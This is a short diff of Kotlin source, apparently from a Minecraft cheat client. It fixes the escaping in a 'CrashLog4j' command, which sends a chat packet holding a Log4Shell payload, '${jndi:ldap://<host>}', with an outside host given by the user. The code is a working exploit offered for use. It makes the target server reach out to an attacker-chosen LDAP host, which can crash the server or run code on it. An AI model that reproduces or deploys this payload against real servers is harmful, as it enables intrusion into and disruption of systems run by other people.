@@ -19,7 +19,7 @@ class CrashLog4jCommand : Command("CrashLog4j", arrayOf("CrashLog4j")) {
             val crash = args[1]
 
             alert("sent "+args[1])
-            PacketUtils.sendPacketNoEvent(C01PacketChatMessage("${jndi:ldap://"+args[1]+"}"))
+            PacketUtils.sendPacketNoEvent(C01PacketChatMessage("\${jndi:ldap://"+args[1]+"}"))
             return
         }
 
